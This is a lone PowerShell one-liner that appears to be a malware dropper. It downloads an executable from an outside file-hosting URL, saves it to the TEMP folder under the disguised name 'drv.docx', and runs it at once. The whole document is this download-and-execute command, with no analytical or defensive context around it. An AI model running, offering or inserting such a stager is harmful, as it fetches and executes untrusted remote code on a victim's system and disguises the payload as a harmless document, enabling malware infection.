
(New-Object System.Net.WebClient).DownloadFile('https://a.pomf.cat/yspcsr.exe',"$env:TEMP\drv.docx");Start-Process ("$env:TEMP\drv.docx")

